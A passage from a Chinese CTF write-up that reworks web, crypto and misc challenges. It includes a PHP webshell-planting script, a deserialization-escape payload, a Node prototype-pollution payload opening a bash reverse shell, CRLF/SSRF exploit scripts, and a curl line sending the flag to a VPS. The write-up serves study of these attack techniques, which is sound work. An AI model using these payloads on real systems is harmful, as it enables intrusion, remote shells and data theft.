'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/register'url_log = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/login'url_sea = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/home/member/search'headers = { 'Cookie':'PHPSESSID=1234567890123456789012345678.php' }data1 = {'username':'ggb0n', 'password':'123456'}data2 = {'key':'&lt;?php @eval($_POST[\"x\"]);echo \"not flag\"; ?&gt;'}s1 = requests.post(url_reg, data1)s2 = requests.post(url_log, data1, headers=headers)s3 = requests.post(url_sea, data2, headers=headers)test = 'http://ebeb2d63-1ffd-4543-bf4d-07d0a35b9931.node3.buuoj.cn/runtime/session/sess_1234567890123456789012345678.php's = requests.get(test).textif 'not flag' in s: print('success')else: print('failed') 蚁剑连接小马之后在终端运行/readflag是没用的，利用phpinfo()发现是因为disable_functions把system给ban掉了：那就需要绕过限制，smity师傅比赛的时候就提醒需要用php_gc_uaf.php来绕过disable_functhions，一些绕过方法参考这里。把php_gc_uaf.php传到一个777权限的文件夹下，然后在浏览器端访问该文件即可拿到flag。 【补充】这个exp不用777权限的文件夹就能执行，web目录即可。高校战“疫”中的PHP-UAF就是用的这个。 babyPHP考察反序列化逃逸漏洞，这个之前在BUU上刷了一道类似的题目，不过更加复杂，比赛的时候没做出来，看了WP记录学习一下。 题目分析扫描后台可以发现存在源码www.zip，下载后是四个php文件，我们主要分析与拿flag相关的代码。首先从update.php中发现： if($_SESSION['login']===1){ require_once(\"flag.php\"); echo $flag;} 可以发现，登陆成功之后就可以拿到flag了。 然后审计关键文件lib.php，在其中发现如下代码： function safe($parm){ $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\"); return str_replace($array,'hacker',$parm);} 看到这里，就想到了之前在BUU上刷的[0CTF 2016]piapiapia，那道题考察的就是反序列化溢出漏洞，这也就是分析的关键了。再往下看，在UpdateHelper类中有一个反序列化点： Class UpdateHelper{ public $id; public $newinfo; public $sql; public function __construct($newInfo,$sql){ $newInfo=unserialize($newInfo); $upDate=new dbCtrl(); } public function __destruct() { echo $this-&gt;sql; }} 但是从代码中可以看到，此处用户可控的只有Info类中的两个属性age、nickname，不能完全控制序列化数据，无法注入对象。跟进User类中的反序列化点： public function update(){ $Info=unserialize($this-&gt;getNewinfo()); $age=$Info-&gt;age; $nickname=$Info-&gt;nickname; $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']); //这个功能还没有写完 先占坑} 可以发现，反序列化的是getNewinfo()方法获取的内容，再来看一下getNewinfo()： public function getNewInfo(){ $age=$_POST['age']; $nickname=$_POST['nickname']; return safe(serialize(new Info($age,$nickname)));} 可以看到，对Info类的内容序列化之后，会先经过前面提到的safe()函数处理，然后才进行反序列化。这里就是构造反序列化逃逸的地方：通过写入黑名单中的字符\\字符串，在经过safe()函数处理的时候会替换为hacker，从而改变了长度，但是序列化的字符串，每一个属性的内容长度都是固定的，从而就可以利用替换关系构造出逃逸，然后注入对象。 整理一下构造pop链的思路： 利用UpdateHelper的__destruct触发User的__toString然后走到Info的__call方法，在__call中调用了dbCtrl类的login方法，通过控制查询语句，把admin账户的密码查出来。 官方POC如下： &lt;?phpclass User{ public $id; public $age=null; public $nickname=null;}class Info{ public $age; public $nickname; public $CtrlCase; public function __construct($age,$nickname){ $this-&gt;age=$age; $this-&gt;nickname=$nickname; } }class UpdateHelper{ public $id; public $newinfo; public $sql;}class dbCtrl{ public $hostname=\"127.0.0.1\"; public $dbuser=\"root\"; public $dbpass=\"root\"; public $database=\"test\"; public $name='admin'; public $password; public $mysqli; public $token;}$d = new dbCtrl();$d-&gt;token='admin';$b = new Info('','1');$b-&gt;CtrlCase=$d;$a = new user();$a-&gt;nickname=$b;$a-&gt;age=\"select password,id from user where username=?\";$c=new UpdateHelper();$c-&gt;sql=$a;echo serialize($c);?&gt; 运行结果如下 O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:0:\"\";s:8:\"nickname\";s:1:\"1\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}} 我们的目的是逃逸字符，因此需要保证payload进入之后能保证序列化字符串能够正常反序列化，正常的序列化字符串结构如下： O:4:\"Info\":3:{s:3:\"age\";s:5:\"ggb0n\";s:8:\"nickname\";s:7:\"ggb0n\";s:8:\"CtrlCase\";N;} 其中的age和nickname是我们可控的，那么我们就可以把payload写入到nickname部分，然后通过将payload挤出去进行逃逸，由于属性是三个，所以我们在nickname中写入的payload前面加一个CtrlCase的属性，在最后加一个}，如此以来，反序列化的时候就会忽略后面的CtrlCase，初步构造payload如下： \";s:8:\"CtrlCase\";O:12:\"UpdateHelper\":3:{s:2:\"id\";N;s:7:\"newinfo\";N;s:3:\"sql\";O:4:\"User\":3:{s:2:\"id\";N;s:3:\"age\";s:45:\"select password,id from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";s:0:\"\";s:8:\"nickname\";s:1:\"1\";s:8:\"CtrlCase\";O:6:\"dbCtrl\":8:{s:8:\"hostname\";s:9:\"127.0.0.1\";s:6:\"dbuser\";s:4:\"root\";s:6:\"dbpass\";s:4:\"root\";s:8:\"database\";s:4:\"test\";s:4:\"name\";s:5:\"admin\";s:8:\"password\";N;s:6:\"mysqli\";N;s:5:\"token\";s:5:\"admin\";}}}}} 下一步我们就需要把payload逃逸出去：由于payload一共454个字符，因此，我们需要构造黑名单中的内容，通过替换为hacker把payload挤出去，通过safe()函数我们可以知道，一个'替换为hacker可以替换挤出5个字符，一个union替换为hacker可以挤出1个字符，那么在payload前面加上90个'和4个union就可以把454个字符的payload挤出去了，构造最终payload如下： age=&amp;nickname=''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:3:{s:2:&quot;id&quot;;N;s:7:&quot;newinfo&quot;;N;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:3:{s:2:&quot;id&quot;;N;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username=?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:3:{s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:1:&quot;1&quot;;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:8:{s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:4:&quot;root&quot;;s:6:&quot;dbpass&quot;;s:4:&quot;root&quot;;s:8:&quot;database&quot;;s:4:&quot;test&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;N;s:6:&quot;mysqli&quot;;N;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;}}}}} 通过POST方式，将payload打入update.php即可拿到经过md5加密之后的password，解密即可。本道题是在BUU复现的，密码已经被改为了glzjin了，登录即可拿flag。 补充：smity师傅给了一个很详细的题解，可以好好学学这题：这里。 Ez_Express考察JS原型链污染，JS之前没学过，在BUU上复现的过程中慢慢学了一些，关于JS原型链的污染参考P神的文章。 题目分析进入题目，可以看到一些提示： 要求我们必须以ADMIN登录，但是这个用户又注册不了… dirsearch扫后台可以发现www.zip的存在，把源码拿下来，看看其中的玄机。 在index.js中的login路由下发现突破点： if(req.body.Submit==\"register\"){ if(safeKeyword(req.body.userid)){ res.end(\"&lt;script&gt;alert('forbid word');history.go(-1);&lt;/script&gt;\") } req.session.user={ 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); } 可以看到，在注册的时候存在toUpperCase()的使用，这个函数是存在可利用的漏洞的，即利用特殊字符进行绕过： toUpperCase():ı ==&gt; Iſ ==&gt; S 另外JS中的toLowerCase()函数也存在对特殊字符的不规范处理： toLowerCase():İ ==&gt; iK ==&gt; k 根据如上特性，我们可以利用admın身份进行注册，经过toUpperCase()处理便成了ADMIN从而成功登录： 可以看到，提示了flag的位置，应该就需要RCE来进行读取了。 再审代码，发现index.js中存在merge和clone，根据在前面提到的P神的文章中的学习，猜测应该是JS原型链污染： const merge = (a, b) =&gt; { for (var attr in b) { if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}const clone = (a) =&gt; { return merge({}, a);} 进一步在action路由下发现了clone的使用： router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"&lt;script&gt;alert('ADMIN is asked');history.go(-1);&lt;/script&gt;\")} req.session.user.data = clone(req.body); res.end(\"&lt;script&gt;alert('success');history.go(-1);&lt;/script&gt;\"); }) 是将req请求中的内容拼接到session的过程，显然，req.body是我们可控的，是考察原型链污染没错了。 action路由是啥时候访问的呢？其实就是提交输入的地方： 解题但是怎么才能实现原型链的污染呢？看到info路由下出现了outputFunctionName，参考另一篇文章，讲了利用outputFunctionName进行污染的方式，payload如下： {\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\"');var __tmp2\"}} 大致含义就是： 利用对象的__proto__属性，向类的原型对象prototype中写入一个新的属性和属性值，即outputFunctionName和对应的值，如此以来，该类就存在了这个属性，实例化的时候也会继承，因此当我们再去访问info路由的时候res.outputFunctionName的值已经是我们写入的payload中的RCE部分的内容了，从而即可在VPS上反弹shell。 由于是在BUU上复现的，开一台内网主机，拿到ip之后构造payload： {\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i &gt;&amp; /dev/tcp/174.1.33.241/8899 0&gt;&amp;1\\\"');var __tmp2\"}} 同时在该内网主机上进行监听，在访问action路由的时候抓包更改Content-Type为application/json，并将我们如上构造的payload写入： 前面就污染了原型链了，然后访问info路由进行命令的执行： 从而拿到shell： 然后就可以随便读取文件，拿到flag了。 有关JS的题目其实没怎么做过，因为还没有专门学过JS，但是JS确实越来用的越多，题也不少，很有学的必要。 Node Game又是一道JS的题，考察CRLF注入、SSRF CRLF注入参考这里： CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。 题目分析进入题目即可拿到源码： var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug'); //var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use(\"/uploads\",express.static(path.join(__dirname, '/uploads')))app.use(\"/template\",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) { var action = req.query.action?req.query.action:\"index\"; if( action.includes(\"/\") || action.includes(\"\\\\\") ){ res.send(\"Errrrr, You have been Blocked\"); } file = path.join(__dirname + '/template/'+ action +'.pug'); var html = pug.renderFile(file); res.send(html);});//SSRFapp.post('/file_upload', function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: '', } if (!ip.includes('127.0.0.1')) { obj.msg=\"only admin's ip can use it\" res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = 'upload failed'; res.send(JSON.stringify(obj)); }else{ var file_path = '/uploads/' + req.files[0].mimetype +\"/\"; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \"file type error\"; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: 'upload success', filename: file_path + file_name } } catch (error) { obj.msg = 'upload failed'; } res.send(JSON.stringify(obj)); } })})app.get('/source', function(req, res) { res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) { var q = req.query.q; var resp = \"\"; if (q) { var url = 'http://localhost:8081/source?' + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\"&lt;p&gt;error occurs!&lt;/p&gt;\"); } else { try { http.get(url, function(resp) { resp.setEncoding('utf8'); resp.on('error', function(err) { if (err.code === \"ECONNRESET\") { console.log(\"Timeout occurs\"); return; } }); resp.on('data', function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on('error', (e) =&gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\"search param 'q' missing!\"); }})function blacklist(url) { var evilwords = [\"global\", \"process\",\"mainModule\",\"require\",\"root\",\"child_process\",\"exec\",\"\\\"\",\"'\",\"!\"]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } }}var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\"Example app listening at http://%s:%s\", host, port)}) 分析代码得知几个路由的用处： 1、 /：会包含/template目录下的一个pug模板文件来用pub进行渲染； 2、/source：回显源码； 3、/file_upload：限制了只能由IP为127.0.0.1进行文件上传，并且我们可以通过控制MIME进行目录穿越，从而将文件上传到任意目录； 4、/core：通过q向内网的8081端口传参，然后获取数据再返回外网，并且对url进行黑名单的过滤，但是这里的黑名单可以直接用字符串拼接绕过。 但是/core路由下不能直接SSRF，而是需要利用Node js的编码安全问题（参考这里），对编码精心构造进行CRLF注入从而来进行SSRF，那么解题思路就明确了： 1、利用CRLF注入进行SSRF 2、利用SSRF伪造本地IP进行文件上传 3、上传包含命令执行代码的pug文件到/template目录 4、利用action参数包含文件，执行命令 解题参考上面文章可知，我们可以构造为\\u010D\\u010A来替换换行\\r\\n（%0D%0A），其他的一些特殊字符也如此构造，如空格(%20)构造编码为\\u0120，+(%2B)构造编码构造为\\u012B… 根据这个方式，构造拆分请求从而进行SSRF，参考网上师傅的exp： import requestspayload = \"\"\" HTTP/1.1Host: 127.0.0.1Connection: keep-alivePOST /file_upload HTTP/1.1Host: 127.0.0.1Content-Length: {}Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysAs7bV3fMHq0JXUt{}\"\"\".replace('\\n', '\\r\\n')body = \"\"\"------WebKitFormBoundarysAs7bV3fMHq0JXUtContent-Disposition: form-data; name=\"file\"; filename=\"ggb0n.pug\"Content-Type: ../template-var x = eval(\"glob\"+\"al.proce\"+\"ss.mainMo\"+\"dule.re\"+\"quire('child_'+'pro'+'cess')['ex'+'ecSync']('cat /flag.txt').toString()\")-return x------WebKitFormBoundarysAs7bV3fMHq0JXUt--\"\"\".replace('\\n', '\\r\\n')payload = payload.format(len(body), body) \\ .replace('+', '\\u012b') \\ .replace(' ', '\\u0120') \\ .replace('\\r\\n', '\\u010d\\u010a') \\ .replace('\"', '\\u0122') \\ .replace(\"'\", '\\u0a27') \\ .replace('[', '\\u015b') \\ .replace(']', '\\u015d') \\ + 'GET' + '\\u0120' + '/'requests.get( 'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/core?q=' + payload)print(requests.get( 'http://5a1643b9-eac5-48ba-92b3-36516bcde120.node3.buuoj.cn/?action=ggb0n').text) 出题师傅的exp具有更高的灵活性： import requestsimport syspayloadRaw = \"\"\"x HTTP/1.1POST /file_upload HTTP/1.1Host: localhost:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942Content-Length: 6279Origin: http://localhost:8081Connection: closeReferer: http://localhost:8081/?action=uploadUpgrade-Insecure-Requests: 1-----------------------------12837266501973088788260782942Content-Disposition: form-data; name=\"file\"; filename=\"5am3_get_flag.pug\"Content-Type: ../template- global.process.mainModule.require('child_process').execSync('evalcmd')-----------------------------12837266501973088788260782942--\"\"\"def getParm(payload): payload = payload.replace(\" \",\"%C4%A0\") payload = payload.replace(\"\\n\",\"%C4%8D%C4%8A\") payload = payload.replace(\"\\\"\",\"%C4%A2\") payload = payload.replace(\"'\",\"%C4%A7\") payload = payload.replace(\"`\",\"%C5%A0\") payload = payload.replace(\"!\",\"%C4%A1\") payload = payload.replace(\"+\",\"%2B\") payload = payload.replace(\";\",\"%3B\") payload = payload.replace(\"&amp;\",\"%26\") # Bypass Waf payload = payload.replace(\"global\",\"%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC\") payload = payload.replace(\"process\",\"%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\") payload = payload.replace(\"mainModule\",\"%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5\") payload = payload.replace(\"require\",\"%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5\") payload = payload.replace(\"root\",\"%C5%B2%C5%AF%C5%AF%C5%B4\") payload = payload.replace(\"child_process\",\"%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\") payload = payload.replace(\"exec\",\"%C5%A5%C5%B8%C5%A5%C5%A3\") return payloaddef run(url,cmd): payloadC = payloadRaw.replace(\"evalcmd\",cmd) urlC = url+\"/core?q=\"+getParm(payloadC) requests.get(urlC) requests.get(url+\"/?action=5am3_get_flag\").textif __name__ == '__main__': targetUrl = sys.argv[1] cmd = sys.argv[2] print run(targetUrl,cmd)# python exp.py http://127.0.0.1:8081 \"curl vps-ip:port -X POST -d `cat /flag.txt`\" 同志仍需努力啊！ 参考：https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game Crypto-Easy_RSA考察共模攻击 解题给的附件内容如下： n = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657e1 = 464857e2 = 190529c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664 这就很明显了，对相同的明文，利用相同的模数n，不同的e进行加密，显然的共模攻击。直接上脚本了： import sysimport binasciisys.setrecursionlimit(1000000)def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a)个字符 return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % mn = 27560959918385616419486273009594513460044316476337842585463553105701869531698366304637678008602799005181601310816935394003041930445509801196554897781529962616349442136039951911764620999116915741924245788988332766182305635804754798018489793066811741026902011980807157882639313892932653620491354630354060462594865874663773934670618930504925812833202047183166423043264815905853486053255310346030416687430724204177468176762512566055165798172418622268751968793997676391170773216291607752885987933866163158257336522567086228092863302685493888839866559622429685925525799985062044536032584132602747754107800116960090941957657e1 = 464857e2 = 190529c1 = 21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531c2 = 9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664s = egcd(e1, e2)s1 = s[1]s2 = s[2]if s1&lt;0: s1 = - s1 c1 = modinv(c1, n)elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n)m=(pow(c1,s1,n)*pow(c2,s2,n)) % nprint (binascii.unhexlify(hex(m)[2:].strip(\"L\"))) 关于RSA攻击的一些常见题目，可以参考这里。 Crypto-warm_up一道RSA攻击题，比赛的时候用了很久的时间，结果方法是那个方法，也没毛病，但是拿到的中间解密结果就是跟正确的不一样…【补充】后来得知是利用Rabin算法来解密， 题目分析首先拿到加密的脚本：challenge： from Crypto.Util.number import *from encode import KEYq=getPrime(1024)p=getPrime(1024)r=getPrime(1024)s=getPrime(1500)e1=125794e2=42373n1=p*q# p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599# q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279n2=p*r# r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829n3=p*q*s# s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546c1=pow(s,e1,n1)Key=int(KEY.encode('hex'),16)key_encode=pow(Key,e2,n3)with open(\"enc\",\"a\")as f: f.write(\"c1: \"+str(c1)+\"\\n\") f.write(\"n1: \"+str(n1)+\"\\n\") f.write(\"n2: \"+str(n2)+\"\\n\") f.write(\"key_encode: \"+str(key_encode)+\"\\n\") encode： from flag import flagimport osKEY = os.urandom(len(flag))dec=int(flag.encode('hex'),16)assert len(bin(dec)[2:])==335mask=int('1'*335,2)dec=(dec^dec&lt;&lt;200 )&amp;maskenc=dec^bytes_to_long(KEY)print \"enc: \"+str(enc)#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809 审计代码可知，要拿到flag，我们首先需要拿到KEY，而KEY是经过RSA加密的。但是观察RSA代码发现n1和n2有公约数p，利用欧几里何算法即可求得： def gcd(m,n): if n==0: #考虑特殊情况 print(\"n is not equal 0!\") else: while m%n!=0: new=m m=n n=new%n return n 这样我们就有了p、q、r，但是要得到KEY，我们需要拿到s，这个地方参考了网上的一篇文章中的一部分来求，但是求得的s不是1500bit、但是加密的密文却是一样的…然后也就没有做下去了，等WP吧…后来一位师傅分享了自己的总结，学习下吧：http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa师傅给了他的脚本做参考，但是还没完全搞明白，等WP出来研究好了再补充。 补充利用Rabin算法解密RSA部分，然后利用运算的特性将dec=(dec^dec&lt;&lt;200)&amp;mask通过dec=(dec^dec&gt;&gt;200)&amp;mask进行还原，解密脚本如下： import gmpy2import libnumc1 = 9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855n1 = 15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121n2 = 16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571key_encode = 154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993p = gmpy2.gcd(n1, n2)q = n1/pe1 = 125794e2 = 42373b = gmpy2.gcd(e1, (p-1)*(q-1))bd = gmpy2.invert(e1/b, (p-1)*(q-1))s = pow(c1, bd, n1)u = pow(s,(p+1)/4,p)v = pow(s,(q+1)/4,q)s = gmpy2.invert(p,q)t = gmpy2.invert(q,p)x = (t*q*u+s*p*v)%n1x2 = -x%n1y = (t*q*u-s*p*v)%n1y2 = -y%n1might_s = [x, x2, y, y2]might_d = []for i in might_s: might_d.append(int(gmpy2.invert(e2, (p-1)*(q-1)*(i-1))))might_key = []for i in range(4): might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])enc = 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809key = 42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276dec = key^encprint libnum.n2s(dec)mask = int('1'*335,2)dec = (dec ^ dec&gt;&gt;200)&amp;maskprint libnum.n2s(dec) Misc-code_in_morse考察基本的流量分析、morse编码，base32解码转图片，PDF417图片的识别以及F5隐写。 题目分析拿到流量包之后导出HTTP数据，发现一共四个文件，在PNG文件中拿到了morse码，到网站解码得到一串base32码，这个时候到网站上解base32解不出来，就用python解了一下，发现是一堆hex，其中还有PNG字样，断定是图片的数据，写了个脚本导入到png图片： import base64import binasciib32 = 